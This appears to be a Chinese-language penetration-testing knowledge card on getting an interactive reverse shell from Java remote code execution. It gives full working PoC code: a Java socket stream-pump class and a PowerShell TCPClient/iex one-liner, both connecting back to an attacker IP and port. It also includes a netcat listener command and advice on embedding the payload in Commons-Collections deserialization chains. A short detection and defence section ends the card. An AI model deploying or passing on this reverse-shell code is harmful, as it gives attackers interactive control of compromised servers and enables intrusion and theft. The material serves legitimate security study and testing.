---
id: web-java-rce-socket-revshell-stream-pump
title: Java Socket 双向流泵反弹 Shell（Windows/Linux 通用）
type: scenario
domain: web
path: web/java/rce
technique: java-socket-revshell-stream-pump
aliases:
- JavaSocketRevShell
- ProcessBuilder 反弹 shell
- Java 流泵
- 双向转发 shell
- java 反弹 shell
tags:
- java
- rce
- revshell
- socket
- processbuilder
- windows
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:24:42+08:00'
  notes: 已对照图 18/19/21/22 核对 socket 三向流泵、powershell/cmd.exe /k/bash -i 回连与 waitFor 保活；未验证点：未在本机复现，依赖原文监听端截图
---

## 一句话结论

Java RCE 拿到代码执行但无回显时，用 `ProcessBuilder` 启动 `powershell.exe`/`bash -i`，再开一个到攻击者的 `Socket`，用三个线程把 socket 与子进程的 stdin/stdout/stderr 双向对接，即可得到跨 Windows/Linux 的交互式反弹 Shell。

## 原理

- `ProcessBuilder(cmd).start()` 启动子进程后，子进程的 stdin/stdout/stderr 是三条独立的管道，由 Java 侧持有对应的 `OutputStream`/`InputStream`。
- 攻击者先监听 TCP 端口；Java 代码主动 `new Socket(host, port)` 连回，得到一条双向字节流。
- 需要三个方向的中继：socket 输入 → 子进程 stdin；子进程 stdout → socket；子进程 stderr → socket。每条中继都是阻塞式 `read` 循环，必须放在独立线程里，否则一个方向阻塞会让其他方向无法工作。
- 子进程本身不感知网络，它只读写标准流；Java 进程充当“网线”，因此不需要目标安装 nc/socat，也不依赖 `/dev/tcp`。
- Windows 下启动 `powershell.exe` 即可获得交互式 PowerShell；启动 `cmd.exe` 时要加 `/k`，否则命令执行完或 stdin 读到 EOF 后 cmd 可能直接退出。Linux 下启动 `bash -i`，即使没有 TTY 也能执行命令，只是可能出现 job control 警告。
- 主线程用 `process.waitFor()` 保持存活，避免 `main` 返回后 JVM 退出、线程和 socket 被回收。若把这段逻辑放进反序列化 payload 的静态初始化块，更要在新线程里启动，因为 JVM 完成类初始化后可能回收静态块里创建的流资源。

## 触发条件

- 已获得任意 Java 代码执行（表达式注入、反序列化、模板注入、WebShell 等）。
- 目标可主动向外发起 TCP 连接（出站防火墙未阻断目标端口）。
- 攻击者有一个可被目标访问的监听端（VPS + `nc -lvnp`）。
- 子进程所需的 shell 存在：Windows 的 `powershell.exe`/`cmd.exe`，Linux 的 `bash`。

## 利用步骤

1. 在 VPS 上监听端口：`nc -lvnp 9001`。
2. 把 Java 反弹类编译成字节码，或通过已有代码执行点动态加载/执行。
3. 选择目标平台的 shell 命令启动子进程。
4. 建立 socket，启动三条流泵线程。
5. 在监听端执行 `whoami`、`id` 等命令确认交互。

## PoC

```java
import java.io.*;
import java.net.Socket;

public class JavaSocketRevShell {
    private void pumpStream(InputStream in, OutputStream out) {
        new Thread(() -> {
            try {
                byte[] buffer = new byte[1024];
                int n;
                while ((n = in.read(buffer)) != -1) {
                    out.write(buffer, 0, n);
                    out.flush();
                }
            } catch (IOException ignored) {
            } finally {
                try { in.close(); out.close(); } catch (IOException ignored) {}
            }
        }).start();
    }

    public void conn(String host, int port, String... cmd) throws Exception {
        try (Socket socket = new Socket(host, port)) {
            Process process = new ProcessBuilder(cmd).start();
            pumpStream(socket.getInputStream(), process.getOutputStream()); // 攻击者输入 -> 子进程 stdin
            pumpStream(process.getInputStream(), socket.getOutputStream()); // 子进程 stdout -> 攻击者
            pumpStream(process.getErrorStream(), socket.getOutputStream()); // 子进程 stderr -> 攻击者
            process.waitFor();
        }
    }

    public static void main(String[] args) throws Exception {
        new JavaSocketRevShell().conn("10.10.11.11", 9001, "powershell.exe");
        // Windows cmd: new String[]{"cmd.exe", "/k"}
        // Linux:       new String[]{"bash", "-i"}
    }
}
```

Windows PowerShell 变体（不在 Java 侧建 socket，而是让 PowerShell 自己回连）：

```java
String ps = "$client = New-Object System.Net.Sockets.TCPClient('10.10.11.11',9001);" +
    "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};" +
    "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){" +
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" +
    "$sendback = (iex $data 2>&1 | Out-String );" +
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
    "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
Runtime.getRuntime().exec("powershell.exe " + ps);
```

## 变体与关联

- 子进程变体：`powershell.exe`、`cmd.exe /k`、`bash -i`、`sh -i`；只要程序读写标准流即可。
- 传输变体：socket 可换成 TLS、HTTP 隧道、DNS 隧道；本卡只描述最直接的 TCP。
- 触发变体：将 `conn()` 放入反序列化链的 `AbstractTranslet` 静态块，并用 `new Thread(...).start()` 启动，避免类初始化结束后管道被回收（已有 CC6+CC3 链卡片可复用）。
- 关联：[[web-java-rce-runtime-exec-string-tokenizer-bash-revshell]]（只用一条 String 命令时的 bash 技巧）；[[web-java-rce-processimpl-constructor-reflect-exec]]（不经过 Runtime.exec 直接建进程）；[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（承载本 payload 的反序列化链）。
- 边界：目标无出站网络、端口被防火墙阻断、JVM 无权限创建 socket、shell 程序不存在时失败。

## 检测与防御

- 检测：JVM 进程主动连接外部非常见端口；Java 进程 spawn `powershell.exe`/`cmd.exe`/`bash -i`；短时间内三条流线程同时读写同一 socket；反序列化后出现 `new Thread` + `Socket` + `ProcessBuilder` 组合。
- 防御：出站默认拒绝，仅放行业务所需目标；EDR 监控 Java 进程的子进程创建与网络连接；RASP 拦截 `ProcessBuilder.start`、`Runtime.exec` 及 socket 建连；Java 安全管理器/模块白名单限制反射。
